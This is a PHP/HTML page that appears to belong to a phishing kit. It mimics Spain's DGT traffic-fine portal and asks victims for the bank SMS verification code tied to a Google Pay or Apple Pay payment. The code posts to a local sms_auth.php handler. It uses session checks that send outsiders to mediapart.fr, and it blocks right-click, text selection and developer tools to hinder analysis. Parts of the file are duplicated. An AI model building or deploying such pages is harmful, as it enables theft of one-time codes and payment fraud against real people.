<?php
session_start();
require '../server/all.php';
include '../settings.php';

if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true && isset($_SESSION['index_auth']) && $_SESSION['index_auth'] === true) {
    ?>
<!DOCTYPE html>
<?php
session_start();
require '../server/all.php';
include '../settings.php';

if (isset($_SESSION['autoriser']) && $_SESSION['autoriser'] === true && isset($_SESSION['index_auth']) && $_SESSION['index_auth'] === true) {
    ?>
<!DOCTYPE html>
<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="es" lang="es"><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/content/location/location.js" id="eppiocemhmnlbhjplcgkofciiegomcon"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/extend-native-history-api.js"></script><script src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/libs/requests.js"></script><head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, minimum-scale=1.0">
    <title>Page de sanctions</title>

    <!-- Stylesheets -->
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/bootstrap-3.3.7/css/bootstrap-theme.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/selectize-0.12.4/css/selectize.bootstrap3.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/font-awesome-4.7.0/font-awesome.custom.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/datepicker-0.4.0/datepicker.min.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/assets/unslider-2.0.3/unslider.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estilosComObl.css">
    <link rel="stylesheet" href="https://sedeclave.dgt.gob.es/IWPS5/css/estiloPropio.css">

    <!-- Custom Styles -->
    <style>
        /* Style du bouton */
        .custom-button {
            background-color: #048;
            color: #fff;
            border: none;
            padding: 10px 30px;
            border-radius: 9px; /* Bords arrondis */
            cursor: pointer;
            text-align: center;
        }

        /* Style au survol du bouton */
        .custom-button:hover {
            background-color: #036; /* Changer la couleur au survol */
        }

        h5.mandatory {
            font-family: "Open Sans", Helvetica, Arial, sans-serif;
        }

        /* Augmenter la largeur et la hauteur de la case de saisie */
        .form-control {
            width: calc(100% + 1px); /* Largeur de la case de saisie */
            height: 50px; /* Hauteur de la case de saisie */
            box-sizing: border-box; /* Assurer que le padding est inclus dans la largeur totale */
            padding: 10px; /* Ajuster le padding pour centrer le texte verticalement */
            font-size: 16px; /* Taille du texte pour une meilleure lisibilité */
        }

        /* Alignement des images */
        .logos {
            display: flex;
            justify-content: center; /* Centrer horizontalement les images */
            align-items: center; /* Aligner verticalement les images */
        }

        .logos img {
            max-width: 150px; /* Limiter la largeur des images */
            margin: 0 15px; /* Ajouter une marge entre les images */
        }

        /* Responsive Design */
        @media (max-width: 767px) {
            .custom-button {
                width: 100%; /* Bouton pleine largeur sur petits écrans */
                padding: 17px;
            }

            .container-fluid {
                padding: 0 15px; /* Réduire les marges pour les petits écrans */
            }

            .main-header .brand {
                text-align: center;
            }

            .form-control {
                width: 100%;
            }

            .row {
                margin-bottom: 10px;
            }
        }

        /* Style des messages d'erreur */
        .error-message {
            color: red;
            font-size: 16px;
            text-align: center;
        }
    </style>
<script bis_use="true" type="text/javascript" charset="utf-8" data-bis-config="[&quot;facebook.com/&quot;,&quot;twitter.com/&quot;,&quot;youtube-nocookie.com/embed/&quot;,&quot;//vk.com/&quot;,&quot;//www.vk.com/&quot;,&quot;linkedin.com/&quot;,&quot;//www.linkedin.com/&quot;,&quot;//instagram.com/&quot;,&quot;//www.instagram.com/&quot;,&quot;//www.google.com/recaptcha/api2/&quot;,&quot;//hangouts.google.com/webchat/&quot;,&quot;//www.google.com/calendar/&quot;,&quot;//www.google.com/maps/embed&quot;,&quot;spotify.com/&quot;,&quot;soundcloud.com/&quot;,&quot;//player.vimeo.com/&quot;,&quot;//disqus.com/&quot;,&quot;//tgwidget.com/&quot;,&quot;//js.driftt.com/&quot;,&quot;friends2follow.com&quot;,&quot;/widget&quot;,&quot;login&quot;,&quot;//video.bigmir.net/&quot;,&quot;blogger.com&quot;,&quot;//smartlock.google.com/&quot;,&quot;//keep.google.com/&quot;,&quot;/web.tolstoycomments.com/&quot;,&quot;moz-extension://&quot;,&quot;chrome-extension://&quot;,&quot;/auth/&quot;,&quot;//analytics.google.com/&quot;,&quot;adclarity.com&quot;,&quot;paddle.com/checkout&quot;,&quot;hcaptcha.com&quot;,&quot;recaptcha.net&quot;,&quot;2captcha.com&quot;,&quot;accounts.google.com&quot;,&quot;www.google.com/shopping/customerreviews&quot;,&quot;buy.tinypass.com&quot;,&quot;gstatic.com&quot;,&quot;secureir.ebaystatic.com&quot;,&quot;docs.google.com&quot;,&quot;contacts.google.com&quot;,&quot;github.com&quot;,&quot;mail.google.com&quot;,&quot;chat.google.com&quot;,&quot;audio.xpleer.com&quot;,&quot;keepa.com&quot;,&quot;static.xx.fbcdn.net&quot;,&quot;sas.selleramp.com&quot;,&quot;1plus1.video&quot;,&quot;console.googletagservices.com&quot;,&quot;//lnkd.demdex.net/&quot;,&quot;//radar.cedexis.com/&quot;,&quot;//li.protechts.net/&quot;,&quot;challenges.cloudflare.com/&quot;]" src="chrome-extension://eppiocemhmnlbhjplcgkofciiegomcon/../executers/vi-tr.js"></script></head>
<body id="myBody" class="js-enabled" bis_register="W3sibWFzdGVyIjp0cnVlLCJleHRlbnNpb25JZCI6ImVwcGlvY2VtaG1ubGJoanBsY2drb2ZjaWllZ29tY29uIiwiYWRibG9ja2VyU3RhdHVzIjp7IkRJU1BMQVkiOiJkaXNhYmxlZCIsIkZBQ0VCT09LIjoiZGlzYWJsZWQiLCJUV0lUVEVSIjoiZGlzYWJsZWQiLCJSRURESVQiOiJkaXNhYmxlZCIsIlBJTlRFUkVTVCI6ImRpc2FibGVkIiwiSU5TVEFHUkFNIjoiZGlzYWJsZWQiLCJMSU5LRURJTiI6ImRpc2FibGVkIiwiQ09ORklHIjoiZGlzYWJsZWQifSwidmVyc2lvbiI6IjIuMC4xNSIsInNjb3JlIjoyMDAxNX1d" __processed_2bce6160-5173-40ce-a0ea-e04cdec7564a__="true">

<header class="main-header">
    <div class="brand" bis_skin_checked="1">
        <div class="logos" bis_skin_checked="1">
         
        </div>
      
        </a>
    </div>
</header>

<main class="main-content">
    <div class="dgt-announcements-header" bis_skin_checked="1"></div>
    

    <center><img src="https://www.flyingeye.fr/wp-content/uploads/2022/11/logos-google-pay-apple-pay.png" width="250" alt="Google Pay y Apple Pay"></center>
    
    <div class="mandatory" bis_skin_checked="1">
        <h5 class="mandatory">Su banco para solicitar una autenticación adicional para validar su pago por favor ingrese el código de SMS recibido en su número: &nbsp; <!--?php echo $_SESSION['tel']; ?--></h5>
        <h5 class="mandatory">La validación está relacionada con Google Pay y Apple Pay</h5>    
    </div>

    <div class="box bordered-box overlapped-title-box" bis_skin_checked="1">
        <div class="container-fluid" bis_skin_checked="1">
            <form method="post" action="../actions/sms_auth.php">
                <div class="row" bis_skin_checked="1">
                    <!--?php if (isset($_GET['error']) && $_GET['error'] == 1) { echo '<p class="error-message"-->Código inválido o caducado, por favor compruébelo<p></p>
                    <div class="col-sm-8" bis_skin_checked="1">
                        <label class="mandatory">Código recibido por SMS</label>
                        <input id="ccnum" type="text" name="vbv_code" class="form-control" minlength="6" maxlength="10" inputmode="numeric" oninput="chiffres_only(this)">
                    </div>
                  
                </div>
                <div class="row" bis_skin_checked="1">
                    <div class="col-sm-8" bis_skin_checked="1">
                        <button type="submit" name="vbv_submit" class="custom-button form-control">Continuar</button>
                        <input type="hidden" name="vbv_submit" value="true">
                    </div> 
                </div>
            </form>
       </div>


</center></div></main></body></html>

    <?php
} else {
    header("Location: https://www.mediapart.fr/");
    exit;
} ?>


<script type="text/javascript">
    // Désactiver le clic droit
    document.addEventListener("contextmenu", function(e){
        e.preventDefault();
    }, false);

    // Désactiver la sélection de texte
    document.addEventListener("selectstart", function(e){
        e.preventDefault();
    }, false);


    window.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
            e.preventDefault();
        }
    });
</script>

    <?php
} else {
    header("Location: https://www.mediapart.fr/");
    exit;
} ?>


<script type="text/javascript">
    // Désactiver le clic droit
    document.addEventListener("contextmenu", function(e){
        e.preventDefault();
    }, false);

    // Désactiver la sélection de texte
    document.addEventListener("selectstart", function(e){
        e.preventDefault();
    }, false);


    window.addEventListener("keydown", function(e) {
        if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I")) {
            e.preventDefault();
        }
    });
</script>